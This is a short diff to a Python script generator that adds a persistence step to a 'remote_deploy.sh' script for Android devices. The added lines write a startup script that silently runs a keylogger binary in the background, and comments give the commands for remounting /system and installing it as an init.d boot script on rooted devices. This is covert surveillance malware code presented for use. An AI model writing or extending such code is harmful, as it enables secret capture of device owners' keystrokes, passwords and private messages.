@@ -98,6 +98,22 @@ screencap -p /data/local/tmp/deploy_screen.png
 
 # Log deployment
 echo "Remote deployment completed at $(date)" >> /data/local/tmp/deploy.log
+
+# Persistence Setup (Requires Root/System Privileges)
+# Create startup script
+cat << 'EOF' > /data/local/tmp/startup.sh
+#!/bin/sh
+nohup /data/local/tmp/keylogger > /dev/null 2>&1 &
+EOF
+chmod +x /data/local/tmp/startup.sh
+
+# Note: Modifying init.rc or dropping scripts into /system/etc/init.d/ 
+# or /data/local/userinit.d/ requires the device to be rooted and the 
+# system partition mounted as read-write.
+# Example (if rooted):
+# mount -o rw,remount /system
+# cp /data/local/tmp/startup.sh /system/etc/init.d/99keylogger
+# chmod 755 /system/etc/init.d/99keylogger
 \"\"\"
         with open("remote_deploy.sh", "w") as f:
             f.write(script_content)
